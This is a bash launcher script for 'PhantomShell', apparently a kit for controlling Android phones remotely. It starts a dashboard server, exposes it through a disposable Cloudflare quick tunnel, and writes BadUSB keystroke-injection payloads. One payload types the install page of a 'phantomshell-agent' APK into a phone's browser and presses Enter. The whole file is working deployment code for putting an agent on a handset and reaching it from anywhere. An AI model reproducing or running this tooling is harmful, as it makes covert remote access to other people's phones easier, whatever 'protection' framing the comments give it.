#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# start.sh - run the whole PhantomShell server side, in one command.
#
#   ./start.sh                       # tunnel (random link) -> fall back to LAN
#   PS_REQUIRE_TUNNEL=1 ./start.sh   # tunnel only, stop if it cannot be made
#   PS_TUNNEL=0 ./start.sh           # skip the tunnel, LAN only
#   PS_PORT=8099 ./start.sh          # different port
#
# What it does:
#   1. starts the dashboard server on port 8085
#   2. opens the Cloudflare quick tunnel (a NEW random
#      https://something-something-something.trycloudflare.com address every run)
#      trying three times: default (quic), then http2, then http2 with more time
#   3. only trusts a tunnel address that answers /health through it, so a broken
#      link can never be baked into your payloads
#   4. writes the two payload files with that address
#   5. also reports your LAN address and public IP, in case you need them
#
# Keep this window open. Ctrl+C stops the server and the tunnel together.
# ---------------------------------------------------------------------------
set -uo pipefail

KIT="$(cd "$(dirname "$0")" && pwd)"
PORT="${PS_PORT:-8085}"
SERVER="$KIT/server/phantomshell_server.py"
PAYLOAD_DIR="$KIT/payloads"
RUN_DIR="$KIT/.run"
TUNNEL_LOG="$RUN_DIR/tunnel.log"
SERVER_LOG="$RUN_DIR/server.log"
SERVER_PIDFILE="$RUN_DIR/server.pid"
TUNNEL_PIDFILE="$RUN_DIR/tunnel.pid"

mkdir -p "$PAYLOAD_DIR" "$RUN_DIR"

info()  { printf '%s\n' "$*"; }
fail()  { printf '[!] %s\n' "$*"; }

# ---- stop anything this kit started last time ----------------------------
for pf in "$SERVER_PIDFILE" "$TUNNEL_PIDFILE"; do
  if [ -f "$pf" ]; then
    old="$(cat "$pf" 2>/dev/null || true)"
    if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then
      info "      stopping previous run (pid $old)"
      kill "$old" 2>/dev/null || true
      sleep 1
    fi
    rm -f "$pf"
  fi
done

# ---- 0. the files this script needs --------------------------------------
missing=0
for f in "$SERVER" "$KIT/server/index.html" "$KIT/server/agent.html" \
         "$KIT/server/login.html" "$KIT/server/logo.jpg"; do
  if [ ! -f "$f" ]; then fail "missing file: $f"; missing=1; fi
done
if [ ! -f "$KIT/server/apks/phantomshell-agent.apk" ]; then
  fail "missing the agent APK: $KIT/server/apks/phantomshell-agent.apk"
  info "    the dashboard would start, but the phone could not download the agent"
fi
if [ "$missing" = "1" ]; then
  info ""
  info "    You are running: $KIT/start.sh"
  info "    It expects its files in: $KIT/server/"
  info "    Run it from inside the kit folder: cd ~/phantomshell && bash ./start.sh"
  exit 1
fi

# ---- 1. server -----------------------------------------------------------
if command -v ss >/dev/null 2>&1 && ss -ltn 2>/dev/null | grep -q ":$PORT "; then
  fail "port $PORT is already in use by another process."
  info "    Stop it, or use another port:  PS_PORT=8099 ./start.sh"
  ss -ltnp 2>/dev/null | grep ":$PORT " | sed 's/^/      /'
  exit 1
fi

info "[1/4] starting dashboard server on port $PORT ..."
: > "$SERVER_LOG"
setsid nohup python3 "$SERVER" >>"$SERVER_LOG" 2>&1 < /dev/null &
SERVER_PID=$!
echo "$SERVER_PID" > "$SERVER_PIDFILE"
sleep 2

problem=""
if ! kill -0 "$SERVER_PID" 2>/dev/null; then
  problem="the server process exited immediately"
elif grep -qiE 'address already in use|traceback|syntaxerror' "$SERVER_LOG"; then
  problem="the server reported an error while starting"
elif ! curl -fsS -m 5 "http://127.0.0.1:$PORT/health" >/dev/null 2>&1; then
  problem="the server did not answer on port $PORT"
fi
if [ -n "$problem" ]; then
  fail "$problem"
  info "    Last log lines:"
  tail -20 "$SERVER_LOG"
  rm -f "$SERVER_PIDFILE"
  exit 1
fi
info "      server is up -> http://127.0.0.1:$PORT/login (pid $SERVER_PID)"

# ---- 2. the LAN address and public IP (reported, not used first) ---------
LAN_IP=""
for ip in $(hostname -I 2>/dev/null); do
  case "$ip" in
    127.*|169.254.*|::*) continue ;;
  esac
  case "$ip" in
    *:*) continue ;;                 # skip IPv6 for now
  esac
  LAN_IP="$ip"
  break
done
if [ -z "$LAN_IP" ]; then
  LAN_IP="$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')"
  case "$LAN_IP" in 169.254.*|127.*) LAN_IP="" ;; esac  # link-local is no use
fi
LAN_URL=""
[ -n "$LAN_IP" ] && LAN_URL="http://$LAN_IP:$PORT"

PUBLIC_IP="$(curl -fsS -m 4 https://api.ipify.org 2>/dev/null || true)"
[ -z "$PUBLIC_IP" ] && PUBLIC_IP="$(curl -fsS -m 4 https://ifconfig.me/ip 2>/dev/null || true)"

# ---- 3. the Cloudflare quick tunnel --------------------------------------
# A fresh random address is requested on every run. cloudflared is retried with
# a different transport if the first attempt fails: UDP/443 (quic) is blocked on
# a lot of mobile and campus networks, and http2 over TCP/443 gets through.
TUNNEL_URL=""
TUNNEL_PID=""
REQUIRE_TUNNEL="${PS_REQUIRE_TUNNEL:-0}"
WANT_TUNNEL="${PS_TUNNEL:-1}"
[ "$REQUIRE_TUNNEL" = "1" ] && WANT_TUNNEL=1

if [ "$WANT_TUNNEL" != "1" ]; then
  info "[2/4] tunnel skipped (PS_TUNNEL=0) - LAN only."
elif ! command -v cloudflared >/dev/null 2>&1; then
  info "[2/4] cloudflared is not installed - cannot make a tunnel."
  info "      sudo apt install -y cloudflared"
  info "      (or download the .deb from https://github.com/cloudflare/cloudflared/releases/latest)"
else
  proto_args=("" "--protocol http2" "--protocol http2")
  proto_name=("quic" "http2" "http2 (extra time)")
  proto_wait=(30 30 45)

  for i in 0 1 2; do
    if [ "$i" = "0" ]; then
      info "[2/4] requesting a random Cloudflare tunnel (quic) ..."
    else
      info "[2/4] retry $i with ${proto_name[$i]} ..."
    fi

    : > "$TUNNEL_LOG"
    # shellcheck disable=SC2086
    setsid nohup cloudflared tunnel --url "http://localhost:$PORT" --no-autoupdate \
        ${proto_args[$i]} >>"$TUNNEL_LOG" 2>&1 < /dev/null &
    TUNNEL_PID=$!
    echo "$TUNNEL_PID" > "$TUNNEL_PIDFILE"

    printf '      waiting for the address'
    for _ in $(seq 1 "${proto_wait[$i]}"); do
      # - "api.trycloudflare.com" is Cloudflare's API host and appears in error
      #   messages, never as a tunnel. Excluding it is what stops a failed run
      #   from baking Cloudflare's API host into the payloads.
      # - the candidate must answer /health through the tunnel before we keep it.
      for cand in $(grep -oE 'https://[a-z0-9][a-z0-9-]*\.trycloudflare\.com' "$TUNNEL_LOG" \
                    | grep -v '^https://api\.' | sort -u); do
        # Try normally first, then forced IPv4. A host that resolves to IPv6
        # only, on a machine with a broken IPv6 route, fails instantly and
        # would otherwise make a perfectly good tunnel look dead.
        if curl -fsS -m 8 "$cand/health" 2>/dev/null | grep -q alive \
           || curl -4 -fsS -m 8 "$cand/health" 2>/dev/null | grep -q alive; then
          TUNNEL_URL="$cand"
          break
        fi
      done
      [ -n "$TUNNEL_URL" ] && break
      printf '.'
      sleep 1
    done
    printf '\n'

    if [ -n "$TUNNEL_URL" ]; then
      info "      tunnel verified: $TUNNEL_URL/health answered"
      break
    fi

    kill "$TUNNEL_PID" 2>/dev/null || true
    wait "$TUNNEL_PID" 2>/dev/null || true
    TUNNEL_PID=""
    rm -f "$TUNNEL_PIDFILE"
  done

  if [ -z "$TUNNEL_URL" ]; then
    fail "could not create a Cloudflare tunnel after 3 attempts."
    # Work out which layer is broken so the fix is obvious.
    if ! getent hosts api.trycloudflare.com >/dev/null 2>&1; then
      info ""
      info "    CAUSE: DNS. This machine cannot resolve api.trycloudflare.com, so"
      info "    cloudflared never reaches Cloudflare and no random link is created."
      info "    Your resolver (the one in /etc/resolv.conf) is timing out."
      info ""
      info "    check : getent hosts api.trycloudflare.com"
      info "    fix   : echo 'nameserver 1.1.1.1' | sudo tee /etc/resolv.conf"
      info "    or    : sudo nmcli con mod \"<your connection>\" ipv4.dns \"1.1.1.1 8.8.8.8\""
      info "            sudo nmcli con mod \"<your connection>\" ipv4.ignore-auto-dns yes"
      info "            sudo nmcli con up \"<your connection>\""
    elif ! timeout 5 bash -c 'exec 3<>/dev/tcp/api.trycloudflare.com/443' 2>/dev/null; then
      info ""
      info "    CAUSE: outbound TCP/443 is blocked. DNS works, but Cloudflare is"
      info "    unreachable from this network - a firewall, proxy or captive portal."
      info ""
      info "    check : curl -sS -m 8 https://api.trycloudflare.com -o /dev/null -w '%{http_code}\\n'"
      info "    fix   : use a network that allows outbound 443, or configure a proxy"
    else
      info ""
      info "    CAUSE: DNS and TCP/443 both look fine, so Cloudflare itself refused"
      info "    or the quick-tunnel service is rate limiting this IP."
      info ""
      info "    wait a minute and run ./start.sh again"
    fi
    info ""
    info "    Last cloudflared lines:"
    grep -viE 'ping_group_range|ICMP proxy' "$TUNNEL_LOG" | tail -5 | sed 's/^/      /'

    if [ "$REQUIRE_TUNNEL" = "1" ]; then
      info ""
      fail "PS_REQUIRE_TUNNEL=1, so stopping here instead of using the LAN address."
      kill "$SERVER_PID" 2>/dev/null || true
      rm -f "$SERVER_PIDFILE"
      exit 2
    fi
    info ""
    info "    Continuing with the LAN address - fix the tunnel for anywhere-access."
  fi
fi

# The address baked into the payloads: the tunnel when there is one, else LAN.
BASE="${TUNNEL_URL:-$LAN_URL}"
if [ -z "$BASE" ]; then
  fail "no tunnel and no LAN address found - only this machine can reach the dashboard."
  info "    The dashboard is still running at http://127.0.0.1:$PORT/login"
  info "    Payloads written from here will only work on this machine:"
  info "    fix the tunnel (see the cause above), or check 'hostname -I'."
  BASE="http://127.0.0.1:$PORT"
fi
INSTALL_URL="$BASE/agent?tag=phone"

# ---- 4. payload files ----------------------------------------------------
info "[3/4] writing payload files ..."
info "      payloads point at: $INSTALL_URL"

cat > "$PAYLOAD_DIR/payload_tunnel_apk.txt" <<EOF
REM PhantomShell - BadUSB payload that fills in this run's tunnel address.
REM
REM WHAT IT IS FOR
REM   PhantomShell is already installed on the phone. The app has a field near
REM   the top called "Dashboard address", and it needs the random Cloudflare
REM   address that start.sh printed this run. This payload types that address
REM   into the field, so nobody has to retype a long random hostname on a phone
REM   keyboard. The address is baked in when start.sh runs.
REM
REM STEP BY STEP (Kiisu v4b on the OTG cable, payload sent with QFlipper)
REM   1. Run ./start.sh on Kali and leave it running. It prints
REM      https://<random-words>.trycloudflare.com - that is the address below.
REM   2. On the phone, open the PhantomShell app.
REM   3. Tap the "Dashboard address" field so the cursor is in it, and clear
REM      whatever is already there (hold the field, Select all, Delete).
REM   4. Plug the Kiisu into the phone.
REM   5. Run this payload from the device.
REM   6. It types the address and presses nothing else. Check the field looks
REM      right, then tap "Start protection" in the app.
REM
REM WHY NO ENTER: this field takes a whole URL, so Enter does nothing useful
REM there - and a stray Enter in any other field can start something else.
REM Typing only is the safe default.
REM
REM If the phone types into the wrong place: skip the automation, type the
REM address by hand. It is the only value that has to be right.
REM
REM NOTE: this runs on the phone, not on a PC. Do not point it at a computer.
DELAY 1200
STRING $BASE
DELAY 700
END
EOF

cat > "$PAYLOAD_DIR/payload_android_ducky.txt" <<EOF
REM PhantomShell - BadUSB for an unlocked Android with a hardware keyboard
REM (Ducky/Flipper in Android/HID mode). Open a browser first and tap the
REM address bar, then run this: it types the install page and presses Enter.
DELAY 800
STRING $INSTALL_URL
ENTER
DELAY 3000
END
EOF

# The address the payloads were baked with, for the dashboard's Connect
# panel. It lives in .run/ (start.sh's own working folder), not in
# payloads/, so payloads/ holds nothing but the two payload files.
printf '%s\n' "$BASE" > "$RUN_DIR/address"

# ---- 5. summary ----------------------------------------------------------
cat <<EOF

[4/4] READY
================================================================================
  RANDOM CLOUDFLARE TUNNEL  (new address every run)
      ${TUNNEL_URL:-NOT AVAILABLE THIS RUN}${TUNNEL_URL:+/login}
      this is what the payloads use, and it works on mobile data too

   LAN        ${LAN_URL:-unavailable}${LAN_URL:+/login}
              same Wi-Fi only

   PUBLIC IP  ${PUBLIC_IP:-unavailable}${PUBLIC_IP:+:$PORT/login}
              needs $PORT/tcp forwarded on the router

  FIRST STEP:  open the link above and press "Create account"
      there is no built-in login - you make your own account on that page
      more people: the same "Create account" tab, one account each
      forgotten password: "Forgot your password?" emails a code
      (mail needs PS_SMTP_HOST / PS_SMTP_FROM / PS_SMTP_PASS)

  Payloads are baked with:
      $INSTALL_URL

  FILES FOR THE PHONE  ($PAYLOAD_DIR)
     1. payload_tunnel_apk.txt     OTG into the phone, fills in the tunnel address
     2. payload_android_ducky.txt  OTG into the phone, types the install page

  The dashboard's "Files for the phone" panel offers these two plus the APK.
  Nothing else is written to payloads/.

  The tunnel address is temporary: stop this script and it dies. Run ./start.sh
  again for a new one, and re-copy the payload to your BadUSB.

  Logs: $SERVER_LOG   |   $TUNNEL_LOG
  Stop everything: Ctrl+C here.
================================================================================
EOF

cleanup() {
  echo
  echo "stopping server and tunnel ..."
  [ -n "${SERVER_PID:-}" ] && kill "$SERVER_PID" 2>/dev/null || true
  [ -n "${TUNNEL_PID:-}" ] && kill "$TUNNEL_PID" 2>/dev/null || true
  rm -f "$SERVER_PIDFILE" "$TUNNEL_PIDFILE"
  exit 0
}
trap cleanup INT TERM
while true; do sleep 3; done
